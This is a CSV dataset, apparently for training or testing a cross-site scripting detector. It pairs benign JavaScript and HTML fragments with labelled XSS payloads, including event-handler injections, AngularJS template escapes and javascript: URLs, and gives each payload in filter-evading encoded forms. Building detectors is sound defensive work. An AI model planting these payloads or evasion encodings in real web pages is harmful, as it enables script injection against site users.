sample_id,label,payload_original,payload_obfuscated,generator,recipe
3091,1,"<form draggable=""true"" ondragend=""alert(1)"">test</form>",JTI1M0Nmb3JtJTI1MjBkcmFnZ2FibGUlMjUzRCUyNTIydHJ1ZSUyNTIyJTI1MjBvbmRyYWdlbmQlMjUzRCUyNTIyYWxlcnQlMjUyODElMjUyOSUyNTIyJTI1M0V0ZXN0JTI1M0MlMjUyRmZvcm0lMjUzRQ==,llm_style_t1.5,double_urlencode+base64+html_entities
3092,0,this.options.dist = 0; this._setcarouselheight(); if (this.showindicators) {,this.options.dist = 0; this._setcarouselheight(); if (this.showindicators) {,llm_style_t1.5,none
3093,1,{{_s.constructor('alert(1)')()}},{{_s.constructor('alert(1) ' )()}},llm_style_t1.5,whitespace_noise
3094,1,"<picture><source srcset=""validimage.png""><img onload=alert(1)></picture>",PHBpY3R1cmU%2BPHNvdXJjZSBzcmNzZXQ9InZhbGlkaW1hZ2UucG5nIj48aW1nIG9ubG9hZD1hbGVydCgxKT48L3BpY3R1cmU%2B,llm_style_t1.5,base64+html_then_urlencode
3095,0,this.$el.append(this.$indicators[0]),this.$el.append(this.$indicators[0]),llm_style_t1.5,none
3096,0,"class collapsible extends component { constructor(el, options) { super(collapsible, el, options);","class collapsible extends component { constructor(el, options) { super(collapsible, el, options);",llm_style_t1.5,none
3097,0,isanimated: this._isanimated() }) },isanimated: this._isanimated() }) },llm_style_t1.5,none
3098,0,return this._element.classlist.contains(class_name_horizontal) ? width : height,return this._element.classlist.contains(class_name_horizontal) ? width : height,llm_style_t1.5,none
3099,0,"this._slide(order, items[index]); } dispose() {","this._slide(order, items[index]); } dispose() {",llm_style_t1.5,none
3100,0,"}, { key: ""_setupeventhandlers"", value: function _setupeventhandlers() {","}, { key: ""_setupeventhandlers"", value: function _setupeventhandlers() {",llm_style_t1.5,none
3101,1,"<noscript draggable=""true"" ondragstart=""alert(1)"">test</noscript>",%253Cnoscript%2520draggable%253D%2522true%2522%2520ondr%252F%252AOBF%252A%252Fagstart%253D%2522alert%25281%2529%2522%253Etest%253C%252F/*OBF*/noscript%253E,llm_style_t1.5,comment_marker+urlencode+html_then_urlencode
3102,0,"insertafter: function (selector) { var _this = this; cash(selector).each(function (el, i) {","insertafter: function (selector) { var _this = this; cash(selector).each(function (el, i) {",llm_style_t1.5,none
3103,1,"<object onmouseup=""alert(1)"">test</object>",Jmx0O29iamVjdCBvbm1vdXNldXA9JnF1b3Q7YWxlcnQoMSkmcXVvdDsmZ3Q7dGVzdCZsdDsvb2JqZWN0Jmd0Ow=  =,llm_style_t1.5,html_entities+base64
3104,1,"<iframe src=""javascript:alert(1)"">",JTNDaWZyYW1lJTIwc3JjJTNEJTIyamF2YXNjcmlwdCU/*OBF*/zQWFsZXJ0JTI4MSUyOSUyMiU/*OBF*/zRQ==,llm_style_t1.5,urlencode+whitespace_noise+base64
3105,0,top: m.getdocumentscrolltop() + this.windowheight / 2 -,top: m.getdocumentscrolltop() + this.windowheight / 2 -,llm_style_t1.5,none
3106,1,{{'a'.constructor.prototype.charat=[].join;$eval('x=1} } };alert(1)//');}},);}}t(  1)/  /' };aler'x=1} };$eval([].joincharat=totype.tor.proonstruc{{'a'.c,llm_style_t1.5,reverse_chunks
3107,0,</span> </li> </ul>,</span> </li> </ul>,llm_style_t1.5,none
3108,0,if (this._isactive) { return; },if (this._isactive) { return; },llm_style_t1.5,none
3109,0,} static get default() { return default$b;,} static get default() { return default$b;,llm_style_t1.5,none
3110,0,"return e(a, c);case ""attribute"": return a.getattribute(c);}return a[c] || 0; }function l(a, c) {","return e(a, c);case ""attribute"": return a.getattribute(c);}return a[c] || 0; }function l(a, c) {",llm_style_t1.5,none
3111,0,} jquery.error(`method ${methodoroptions} does not exist on jquery.${pluginname}`); };,} jquery.error(`method ${methodoroptions} does not exist on jquery.${pluginname}`); };,llm_style_t1.5,none
3112,1,"<div draggable=""true"" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>",JTI1MkZzdHlsZSUyNTNFb3AlMjUyMGhlcmUlMjUzQ3RhYmxlJTI1M0Vkcm50ZW50ZWRpcnQlMjUyODElMjUyOSUyNTIwY29vdmVyJTI1M0RhbGVlJTI1MjBvbmRyYWdpdiUyNTNFJTI1M0NzdHlsYWclMjUyMG1lJTI1M0MlMjUyRmR0YWJsZSUyNTNFZHJudGVudGVkaXRydWUlMjUyMiUyNTIwY29nZ2FibGUlMjUzRCUyNTIyJTI1M0NkaXYlMjUyMGRyYQ==,llm_style_t1.5,reverse_chunks+double_urlencode+base64
3113,1,"<em draggable=""true"" ondragleave=""alert(1)"">test</em>",PGVtIGRyYWdnYWJsZT0idHJ1ZSIgb25kcmFnbGVhdmU9ImFsZXJ0KDEpIj50ZXN0PC9lbT4=,llm_style_t1.5,base64+html_entities
3114,0,"this.dragtarget.removeeventlistener('touchmove', this._handledragtargetdragbound)","this.dragtarget.removeeventlistener('touchmove', this._handledragtargetdragbound)",llm_style_t1.5,none
3115,0,"cash.extend = fn.extend = function (target) { target = target || {}; var args = slice.call(arguments), length = args.length, i = 1;","cash.extend = fn.extend = function (target) { target = target || {}; var args = slice.call(arguments), length = args.length, i = 1;",llm_style_t1.5,none
3116,1,"<summary onmouseleave=""alert(1)"">test</summary>",%3Csummary%20onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,llm_style_t1.5,urlencode+html_entities
3117,0,"} return list[math.max(0, math.min(index, listlength - 1))]; };","} return list[math.max(0, math.min(index, listlength - 1))]; };",llm_style_t1.5,none
3118,0,"<ul><li><a href=""/wiki/hexapod_(robotics)"" title=""hexapod (robotics)"">hexapod </a> </li> </ul> </li>","<ul><li><a href=""/wiki/hexapod_(robotics)"" title=""hexapod (robotics)"">hexapod </a> </li> </ul> </li>",llm_style_t1.5,none
3119,1,"<style>:target {transform: rotate(180deg);}</style><* id=x style=""transition:transform 2s"" ontransitionrun=print()></*>",%253Cstyle%253E%253Atarget%2520%257Btransform%253A%2520r/*OBF*/otate%2528180deg%2529%253B%257D%253C%252Fstyle%253E%253C%252A%2520id%253Dx%2520style%253D%2522transition%253Atransform%25202s%2522%2520ontransitionrun%253Dprint%2528%2529%253E%253C%252F%252A%253E,llm_style_t1.5,double_urlencode+whitespace_noise
3120,0,let clickedindex = $(e.target) .closest('.carousel-item') .index();,let clickedindex = $(e.target) .closest('.carousel-item') .index();,llm_style_t1.5,none
3121,0,_calcrangeoffset() {,_calcrangeoffset() {,llm_style_t1.5,none
3122,0,"this.percentopen = math.min(1, totaldeltax / this._width); this.el.style.transform = transformprefix + "" translatex("" + transformx + ""px)""; this._overlay.style.opacity = this.percentopen;","this.percentopen = math.min(1, totaldeltax / this._width); this.el.style.transform = transformprefix + "" translatex("" + transformx + ""px)""; this._overlay.style.opacity = this.percentopen;",llm_style_t1.5,none
3123,1,"<style>:target {color:red;}</style><blockquote id=x style=""transition:color 1s"" ontransitionend=alert(1)></blockquote>",&lt;style&gt;: target {color:red;}&lt;  /style&gt;&lt; blockquote id=x style= &quot;transition:  color 1s&quot; ontransitionend=alert(1)   &gt;  &lt;/blo/*OBF*/ckquote&gt;,llm_style_t1.5,whitespace_noise+html_entities
3124,0,}); newoptions.spectrum.direction = scope_spectrum.direction; scope_spectrum = newoptions.spectrum;,}); newoptions.spectrum.direction = scope_spectrum.direction; scope_spectrum = newoptions.spectrum;,llm_style_t1.5,none
3125,0,"}, { key: ""_setuplabel"", value: function _setuplabel() {","}, { key: ""_setuplabel"", value: function _setuplabel() {",llm_style_t1.5,none
3126,1,<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>,&lt;strike id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/strike&gt;&lt;input autofocus&gt; ,llm_style_t1.5,html_entities+whitespace_noise
3127,0,"<li id=""cite_note-sf-345""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-sf_345-0"">^ </a> </b>","<li id=""cite_note-sf-345""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-sf_345-0"">^ </a> </b>",llm_style_t1.5,none
3128,1,"<style>:target {transform: rotate(180deg);}</style><audio id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></audio>",%26lt%3Bstyle%26gt%3B%3Atarget%20%7Btra/*OBF*/nsform%3A%20rotate%28180deg%29%3B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Baudio%20id%3Dx%20style%3D%26quot%3Btransition%3At/*OBF*/ransform%202s%26quot%3B%20ontransitionrun%3D/*OBF*/alert%281%29%26gt%3B%26lt%3B%2Faudio%26gt%3B,llm_style_t1.5,html_entities+urlencode
3129,1,"<div draggable=""true"" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>",%26lt%3Bdiv%20draggable%3D%26quot%3Btrue%26quot%3B%20con/*OBF*/tenteditable%26gt%3Bdrag%20me%26lt%3B%2Fdiv%26gt%3B%26lt%3Bi%20ondragover%3Dalert%281%29%20contenteditable%26gt%3Bdrop%20here%26lt%3B%2Fi%26gt%3B,llm_style_t1.5,html_then_urlencode+html_entities
3130,0,fn.extend({ addclass: function (c) { var classes = getclasses(c);,fn.extend({ addclass: function (c) { var classes = getclasses(c);,llm_style_t1.5,none
3131,0,if ( (object.is(':valid') && haslength && len <= lenattr) || (object.is(':valid') && !haslength),if ( (object.is(':valid') && haslength && len <= lenattr) || (object.is(':valid') && !haslength),llm_style_t1.5,none
3132,0,"}); _this52.$anchor.css({ transform: 'translate3d(0,0,0)',","}); _this52.$anchor.css({ transform: 'translate3d(0,0,0)',",llm_style_t1.5,none
3133,1,<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>,&lt;p onfocusout=alert(1) tabind/*OBF*/ex=1 id=x&gt;&lt;/p&gt;&lt;input autofocus&gt;,llm_style_t1.5,html_entities
3134,1,"<center onmousemove=""alert(1)"">test</center>",%253Ccenter%2520onmousemove%253D%2522alert%25281%2529%2522%253Etest%253C%252Fcenter%253E,llm_style_t1.5,urlencode+html_then_urlencode
3135,0,this.$chips = this.$chips.filter(function(el) {,this.$chips = this.$chips.filter(function(el) {,llm_style_t1.5,none
3136,1,<sub id=x tabindex=1 onfocus=alert(1)></sub>,&lt;sub id=x tabindex=1 onfocus=alert(1)&gt;&lt; /sub&gt;,llm_style_t1.5,html_entities
3137,0,"<form id=""rtd-search-form"" class=""wy-form"" action=""search.html"" method=""get"">","<form id=""rtd-search-form"" class=""wy-form"" action=""search.html"" method=""get"">",llm_style_t1.5,none
3138,1,"<select ondblclick=""alert(1)"">test</select>",Jmx0O3NlbGVjdCBvbmRibGNsaWNrPSZxdW90O2FsZXJ0KDEpJnF1b3Q7Jmd0O3Rlc3QmbHQ7L3NlbGVjdCZndDs=,llm_style_t1.5,html_entities+base64
3139,0,"<li><a href=""/wiki/document_management_system"" title=""document management system"">document management </a> </li> </ul>","<li><a href=""/wiki/document_management_system"" title=""document management system"">document management </a> </li> </ul>",llm_style_t1.5,none
3140,0,for (const elem of togglelist) { const selector = selectorengine.getselectorfromelement(elem); const filterelement = selectorengine.find(selector).filter(foundelement => foundelement === this._element);,for (const elem of togglelist) { const selector = selectorengine.getselectorfromelement(elem); const filterelement = selectorengine.find(selector).filter(foundelement => foundelement === this._element);,llm_style_t1.5,none
3141,0,"} if (manipulator.getdataattribute(this, 'slide') === 'next') { carousel.next()","} if (manipulator.getdataattribute(this, 'slide') === 'next') { carousel.next()",llm_style_t1.5,none
3142,1,<marquee id=x tabindex=1 onfocus=alert(1)></marquee>,%25253Cmarquee%252520id%25253Dx%252520tabindex%25253D1%252520onfocus%25253Dalert%2525281%252529%25253E%25253C%25252Fmarquee%25253E,llm_style_t1.5,double_urlencode+urlencode+comment_marker
3143,0,"if ( !(i === high && ignorelast)) { indexes[newpct.tofixed(5)] = [i, type]; }","if ( !(i === high && ignorelast)) { indexes[newpct.tofixed(5)] = [i, type]; }",llm_style_t1.5,none
3144,1,<tt onpointerleave=alert(1)>xss</tt>,JTI2bHQlM0J0dCUyMG9ucG9pbnRlcmxlYXZlJTNEYWxlcnQlMjgxJTI5JTI2Z3QlM0J4c3MlMjZsdCUzQiUyRnR0JTI2Z3QlM0I=,llm_style_t1.5,html_then_urlencode+whitespace_noise+base64
3145,0,val.tolowercase() ); };,val.tolowercase() ); };,llm_style_t1.5,none
3146,0,"? math.max(containerrect.bottom, window.innerheight) : containerrect.bottom; let scrollleft = container.scrollleft;","? math.max(containerrect.bottom, window.innerheight) : containerrect.bottom; let scrollleft = container.scrollleft;",llm_style_t1.5,none
3147,1,"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>",JTI2bHQlM0JzdHlsZSUy/*OBF*/Nmd0JTNC/*OBF*/JTQwa2V5ZnJhbWVzJTIwc2xpZG/*OBF*/VpbiUyMCU3QiU3RCUyNmx0JTNCJTJGc3R5bGUlMjZndCUzQiUyNmx0JTNCeHNzJTIwc3R5bGUlM0QlMjZxdW90JTNCYW5pbWF0aW9uLWR1cmF0aW9uJTNBMXMlM0JhbmltYXRpb24tb/*OBF*/mFtZSUzQXNsaWRlaW4lM0JhbmltYXRpb24taXRlcmF0aW9uLWNvdW50JTNBMiUyN/*OBF*/nF1b3QlM0IlMjBvbmFuaW1hdGlvbml0ZXJhdGlvbiUzRCUyNnF1b3QlM0JhbGVydCUyODElMjklMjZxdW90JTNCJTI2Z3QlM0IlMjZs/*OBF*/dCUzQiUyRnhz/*OBF*/cyU/*OBF*/yNmd0JTNC,llm_style_t1.5,html_entities+urlencode+base64
3148,0,return (uid && `${uid}::${uidevent++}`) || element.uidevent || uidevent++,return (uid && `${uid}::${uidevent++}`) || element.uidevent || uidevent++,llm_style_t1.5,none
3149,0,delete c[key]; } else if (node.dataset) { delete node.dataset[key];,delete c[key]; } else if (node.dataset) { delete node.dataset[key];,llm_style_t1.5,none
3150,0,"each(classes, function (c) {","each(classes, function (c) {",llm_style_t1.5,none
3151,0,if ( namespacedevent.split('.')[0] === 'update' ) {,if ( namespacedevent.split('.')[0] === 'update' ) {,llm_style_t1.5,none
3152,1,"<dt onmousedown=""alert(1)"">test</dt>",PGR0IG9ubW91c2Vkb3duPSJhbGVydCgxKSI+dGVzdDwvZHQ+,llm_style_t1.5,base64
3153,0,"'input[type=text], input[type=password], input[type=email], input[type=url], input[type=tel], input[type=number], input[type=search], input[type=date], input[type=time], textarea'; $(input_selector).each(function(element, index) { let $this = $(this);","'input[type=text], input[type=password], input[type=email], input[type=url], input[type=tel], input[type=number], input[type=search], input[type=date], input[type=time], textarea'; $(input_selector).each(function(element, index) { let $this = $(this);",llm_style_t1.5,none
3154,1,"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationend=""alert(1)""></rtc>",PHN0eWxlPkBrZXlmcmFtZXMge/*OBF*/Ht9PC9zdHlsZT48c/*OBF*/nRjIHN0eWxlPSJhbmltYXRpb24tbmFtZTp4IiBvbmFuaW1hdGlvbmVuZD0iYWxlcnQoMSkiPjwvcnRjPg==,llm_style_t1.5,base64+whitespace_noise
3155,1,"<a href=""//google""></a>",%3Ca%20href%3D%22%2F%2Fgoogle%22%3E%3C%2Fa%3E,llm_style_t1.5,urlencode
3156,1,<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,PHBsYWludGV4dCBvbmZvY3Vzb3V0PWFsZXJ0KDEpIHRhYmluZGV4PTEgaWQ9eD48L3BsYWludGV4dD48aW5wdXQgYXV0b2ZvY3VzPg==,llm_style_t1.5,base64
3157,1,"<div draggable=""true"" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>",%253Cdiv%2520draggable%253D%2522true%2522%2520contenteditable%253Edrag%2520me%253C%252Fdiv%253E%253Cdialog%2520ondragover%253Dalert%25281%2529%2520contenteditable%253Edrop%2520here%253C%252Fdialog%253E,llm_style_t1.5,urlencode+whitespace_noise+html_then_urlencode
3158,1,<mark onfocusout=alert(1) tabindex=1 id=x></mark><input autofocus>,JTNDbWFyayUyMG9uZm9jdXNvdXQlM0R/*OBF*/hbGVydCUyODElMjkl/*OBF*/MjB0YWJpbmRleCUz/*OBF*/R/*OBF* /DElMjBpZCUzRHglM0UlM0MlMkZtYXJrJTNFJTNDaW5wdXQlMjBhdXRvZm9j/*OBF*/dXMlM0U=,llm_style_t1.5,urlencode+base64+comment_marker
3159,0,"<li class=""toclevel-3 tocsection-17""><a href=""#cognitive_simulation""><span class=""tocnumber"">5.2.1","<li class=""toclevel-3 tocsection-17""><a href=""#cognitive_simulation""><span class=""tocnumber"">5.2.1",llm_style_t1.5,none
3160,1,<svg><nav onload=alert(1)></nav>,%26lt%3Bsvg%26gt%3B%26lt%3Bnav%20onload%3Dalert%281%29%26gt%3B%26lt%3B%2Fnav%26gt%3B,llm_style_t1.5,html_then_urlencode+whitespace_noise
3161,1,"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></main>",%253Cst/*OBF*/yle%253E%2540keyframes%2520slidein%2520%257B%257D%253C%252Fstyle%253E%2520%253Cmain%2520style%253D%2522anim/*OBF*/ation-duration%253A1s%253Ba/*OBF*/n/*OBF*/i/*OBF*//*OBF*/m/*OBF*/  ation-na/*OBF*/me%253Aslidein/*OBF*/%253Banimation-iteration-count%253A2%2522%2520onanimationiteration%253D%2522alert%2528%2520%25201%2529%2522%2520%2520%253E%253C%252Fmain%253E,llm_style_t1.5,whitespace_noise+double_urlencode+comment_marker
3162,1,"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationend=""alert(1)""></noscript>","<style>@keyfr/*OBF*/ames x{}</style><noscript style=""animation-name:x"" onanimationend=  ""alert(1)"">< /noscri/  *OBF*/pt>",llm_style_t1.5,comment_marker
3163,0,return domelem.m_toast,return domelem.m_toast,llm_style_t1.5,none
3164,1,"style=""width: expression(alert(''))",style%3D%22width%3A%20expression%28alert%28%27%27%29%29,llm_style_t1.5,urlencode
3165,1,<input4 onpointerup=alert(1)>xss</input4>,%252526lt%25253Binput4%252520onpointerup%25253Dalert%2525281%252529%252526gt%25253Bxss%252526lt%25253B%25252Finput4%252526gt%25253B,llm_style_t1.5,html_then_urlencode+double_urlencode
3166,0,return overflows[a] - overflows[b],return overflows[a] - overflows[b],llm_style_t1.5,none
3167,1,"<table onmouseup=""alert(1)"">test</table>",PHRhYmxlIG9ubW91c2V1cD0iYWxlcnQoMSkiPnRlc3Q8L3RhYmxlPg==,llm_style_t1.5,base64+html_entities
3168,1,"<tfoot draggable=""true"" ondragleave=""alert(1)"">test</tfoot>",Bt%252526gt%25253B%25252Ftfoot%252526lt%25253gt%25253Btesot%25253B%252526%252529%252526qulert%2525281quot%25253Bave%25253D%252526ndragleat%25253B%252520oue%252526quouot%25253Btre%25253D%252526qdraggabltfoot%252520%252526lt%25253B,llm_style_t1.5,html_then_urlencode+reverse_chunks+double_urlencode
3169,0,"}, { key: ""_setcarouselheight"", value: function _setcarouselheight(imageonly) {","}, { key: ""_setcarouselheight"", value: function _setcarouselheight(imageonly) {",llm_style_t1.5,none
3170,0,"duration: this.options.induration, easing: 'easeoutquad' });","duration: this.options.induration, easing: 'easeoutquad' });",llm_style_t1.5,none
3171,0,if (this.options.accordion) { var $collapsiblelis = this.$el.children('li'); var $activelis = this.$el.children('li.active');,if (this.options.accordion) { var $collapsiblelis = this.$el.children('li'); var $activelis = this.$el.children('li.active');,llm_style_t1.5,none
3172,1,"<style>:target {transform: rotate(180deg);}</style><samp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></samp>","samp>1) ><  /= alert(itionrun ontransform 2s""on: transtransitityle=  ""p id=x syle><sam);}</ ste(180degm: rotattransfortarget {<style>:",llm_style_t1.5,whitespace_noise+reverse_chunks
